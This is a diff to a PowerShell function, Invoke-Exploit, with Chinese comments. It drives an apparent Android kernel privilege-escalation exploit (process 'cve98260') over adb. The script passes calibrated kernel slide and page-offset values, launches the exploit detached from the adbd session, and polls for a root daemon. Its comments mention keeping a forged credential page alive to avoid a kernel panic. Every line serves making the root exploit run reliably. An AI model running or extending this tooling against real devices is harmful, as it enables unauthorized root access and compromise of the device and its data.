@@ -221,16 +221,27 @@ function Invoke-Exploit {
     # 拔数据线时 adbd 回收整个会话，park 住的进程被回收 -> 伪 cred 页提前释放
     # -> 内核 panic 重启。这里改用 /system/bin/setsid 显式派生新会话，
     # 再 nohup + 重定向 stdio，彻底与 adbd 解耦。
-    $launch = 'cd {0} && nohup setsid ./run_exploit.sh {1} {2} >{3}/exploit.log 2>&1 </dev/null & sleep 1' -f $REMOTE, $Calib.Slide, $Calib.PageOffset, $RHOME
+    $launch = 'cd {0}; setsid sh -c "./run_exploit.sh {1} {2} >{3}/exploit.log 2>&1; true" </dev/null >/dev/null 2>&1 & sleep 1' -f $REMOTE, $Calib.Slide, $Calib.PageOffset, $RHOME
     [void](Invoke-Adb -AdbArgs @('shell', $launch) -AllowFail)
 
     # exploit 成功后主进程会 park 住、不会退出，所以轮询 rootd 而不是等进程结束。
     $deadline = (Get-Date).AddMinutes(12)
+    $started = Get-Date
     $id = $null
+    $gone = 0
     while ((Get-Date) -lt $deadline) {
         Start-Sleep -Seconds 3
         $id = Test-Rootd
         if ($id) { break }
+        # 注入进程若已消失且始终没拿到 root，说明这一轮失败，不必空等到超时
+        if (((Get-Date) - $started).TotalSeconds -gt 30) {
+            $alive = Invoke-Adb -AdbArgs @('shell', 'ps -A | grep -c cve98260') -AllowFail
+            if ($alive.Trim() -eq '0') { $gone++ } else { $gone = 0 }
+            if ($gone -ge 3) {
+                Write-Log '注入进程已退出且未拿到 root，本轮失败' WARN
+                break
+            }
+        }
     }
 
     # 会话脱离校验：setsid 之后主进程应被 init 收养（PPID=1）。
@@ -238,8 +249,19 @@ function Invoke-Exploit {
     if (-not $ps) { $ps = Invoke-Adb -AdbArgs @('shell', 'ps -A | grep cve98260') -AllowFail }
     if ($ps) {
         Write-Log ("注入进程会话：`n{0}" -f (($ps -split "`n" | Select-Object -First 6) -join "`n"))
-        if ($ps -match '(?m)^\s*\d+\s+\d+\s+1\s') {
-            Write-Log '主进程已脱离 adbd 会话（PPID=1），拔线安全' OK
+        # 判定依据：主进程自己是 session leader（/proc/PID/stat 里 session == pid），
+        # 说明它已脱离 adbd 的会话，拔线时不会被 adbd 回收。
+        $detached = $false
+        $firstPid = (($ps -split "`n")[0] -split '\s+')[1]
+        if ($firstPid -match '^\d+$') {
+            $st = Invoke-Adb -AdbArgs @('shell', "cat /proc/$firstPid/stat 2>/dev/null") -AllowFail
+            if ($st) {
+                $f = $st -split ' '
+                if ($f.Count -gt 5 -and $f[0] -eq $f[5]) { $detached = $true }
+            }
+        }
+        if ($detached) {
+            Write-Log '主进程已脱离 adbd 会话（session leader），拔线安全' OK
         } else {
             Write-Log '警告：未确认会话脱离，拔线仍有 panic 风险' WARN
         }
